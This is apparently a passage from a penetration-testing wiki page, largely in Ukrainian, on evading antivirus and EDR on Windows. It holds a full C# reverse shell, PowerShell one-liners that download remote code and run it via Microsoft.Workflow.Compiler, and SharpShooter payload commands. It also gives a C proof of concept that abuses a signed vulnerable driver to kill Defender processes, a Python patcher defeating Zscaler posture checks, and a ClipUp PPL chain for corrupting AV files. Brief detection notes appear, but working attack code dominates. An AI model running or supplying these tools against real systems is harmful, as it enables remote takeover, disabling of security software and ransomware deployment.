using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# за допомогою компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Детальніше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 використав невелику консольну утиліту відому як **Antivirus Terminator**, щоб відключити endpoint-захист перед скиданням ransomware. Інструмент приносить свій **вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій у ядрі, які навіть Protected-Process-Light (PPL) AV сервіси не можуть заблокувати.

Ключові висновки
1. **Підписаний драйвер**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник — легітимно підписаний драйвер `AToolsKrnl64.sys` з Antiy Labs’ “System In-Depth Analysis Toolkit”. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий його запускає, тому `\\.\ServiceMouse` стає доступним з user land.
3. **IOCTLs, які відкриті драйвером**
| IOCTL code | Можливість                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершити довільний процес за PID (використовується для вбивства Defender/EDR сервісів) |
| `0x990000D0` | Видалити довільний файл на диску |
| `0x990001D0` | Вивантажити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить захист у режимі користувача; код, що виконується в ядрі, може відкрити *protected* процеси, завершити їх або маніпулювати об’єктами ядра незалежно від PPL/PP, ELAM чи інших механізмів захисту.

Виявлення / Мітігація
•  Увімкніть Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.
•  Моніторте створення нових *kernel* сервісів і сповіщайте, коли драйвер завантажується з директорії з правами запису для всіх або не присутній в allow-list.
•  Слідкуйте за дескрипторами в user-mode на кастомні device objects, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує правила device-posture локально і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі архітектурні рішення роблять можливим повний обхід:

1. Оцінювання posture відбувається **повністю на клієнті** (на сервер відправляється булеве значення).
2. Внутрішні RPC endpoint-и лише перевіряють, що підключаючий виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Патчингом чотирьох підписаних бінарників на диску можна нейтралізувати обидва механізми:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка проходить |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть unsigned) процес може підключитись до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Мінімальний уривок патчера:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів та перезапуску стеку сервісів:

* **Усі** перевірки стану показують **зелений/відповідний**.
* Непідписані або змінені бінарні файли можуть відкривати named-pipe RPC endpoints (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Заражений хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як чисто клієнтські рішення довіри та прості перевірки підпису можна обійти кількома байтовими патчами.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) запроваджує ієрархію підписувач/рівень, так що лише захищені процеси з рівнем не нижчим можуть змінювати один одного. З атакуючої точки зору, якщо ви легітимно запускаєте PPL-enabled binary і контролюєте його аргументи, ви можете перетворити нешкідливу функціональність (наприклад, логування) на обмежений, PPL-backed write primitive проти захищених каталогів, що використовуються AV/EDR.

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (та будь-які завантажені DLL) мають бути підписані з PPL-capable EKU.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Неправильні рівні спричинять помилку створення.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Відкритий помічник: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Схема використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарник `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису лог-файлу у шлях, вказаний викликачем.
- Коли запущено як процес PPL, запис файлу відбувається під захистом PPL.
- ClipUp не може розпізнати шляхи, що містять пробіли; використовуйте 8.3 short paths, щоб вказати на зазвичай захищені локації.

8.3 short path helpers
- Перегляд коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-спроможний LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент шляху для лог-файлу, щоб примусити створення файлу в захищеному каталозі AV (наприклад, Defender Platform). При потребі використовуйте 8.3 короткі імена.
3) Якщо цільовий бінар зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження до старту AV, встановивши сервіс автозапуску, який гарантовано виконується раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис під захистом PPL виконується до того, як AV заблокує свої бінарники, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Примітки та обмеження
- Ви не контролюєте вміст, який записує ClipUp, окрім місця розміщення; цей примітив більше підходить для корупції, ніж для точного впровадження вмісту.
- Вимагає локальних прав admin/SYSTEM для встановлення/запуску сервісу та вікна перезавантаження.
- Час виконання критичний: ціль не повинна бути відкрита; виконання під час завантаження уникає блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо коли його батьківським процесом є нестандартні лаунчери, під час завантаження.
- Нові сервіси, налаштовані на автозапуск підозрілих бінарників і що стабільно запускаються до старту Defender/AV. Досліджуйте створення/зміну сервісів перед помилками запуску Defender.
- Моніторинг цілісності файлів у бінарних/Platform директоріях Defender; несподівані створення/зміни файлів процесами з прапорами protected-process.
- ETW/EDR телеметрія: шукати процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівня PPL не-AV бінарниками.

Заходи захисту
- WDAC/Code Integrity: обмежте, які підписані бінарники можуть запускатися як PPL і під якими батьками; блокувати виклики ClipUp поза легітимними контекстами.
- Гігієна сервісів: обмежте створення/зміну сервісів з автозапуском і моніторьте маніпуляції порядком запуску.
- Переконайтесь, що Defender tamper protection та захисти раннього запуску увімкнені; дослідіть помилки запуску, що вказують на пошкодження бінарників.
- Розгляньте відключення генерації коротких імен 8.3 на томах, що містять інструменти безпеки, якщо це сумісно з вашим середовищем (ретельно протестуйте).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
